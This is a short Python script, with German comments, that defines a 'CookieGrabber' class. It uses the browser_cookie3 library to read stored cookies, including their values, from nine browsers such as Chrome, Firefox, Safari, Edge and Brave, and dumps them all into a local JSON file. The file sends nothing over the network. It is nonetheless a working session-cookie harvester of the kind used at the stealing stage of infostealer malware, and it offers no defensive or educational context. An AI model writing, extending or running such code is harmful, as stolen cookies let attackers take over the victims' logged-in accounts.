import browser_cookie3
import json


class CookieGrabber:
    def __init__(self):
        self.browsers = {
            "Safari": browser_cookie3.safari,
            "Chrome": browser_cookie3.chrome,
            "Chromium": browser_cookie3.chromium,
            "Firefox": browser_cookie3.firefox,
            "Edge": browser_cookie3.edge,
            "Opera": browser_cookie3.opera,
            "Brave": browser_cookie3.brave,
            "Vivaldi": browser_cookie3.vivaldi,
            "LibreWolf": browser_cookie3.librewolf,
        }

    def get_browser_cookies(self, name, function):
        """Liest Cookies eines Browsers."""
        try:
            print(f"[+] Lese {name}...")

            cookies = function()

            return [
                {
                    "browser": name,
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                }
                for cookie in cookies
            ]

        except Exception as e:
            print(f"[-] {name}: {e}")
            return []

    def grab_all(self):
        all_cookies = []

        for name, function in self.browsers.items():
            all_cookies.extend(
                self.get_browser_cookies(name, function)
            )

        return all_cookies

    def save_json(self, filename="cookies.json"):
        cookies = self.grab_all()

        with open(filename, "w", encoding="utf-8") as f:
            json.dump(cookies, f, indent=4, ensure_ascii=False)

        print(f"\nGespeichert: {filename}")


"""
    CookieGrabber().save_json()
"""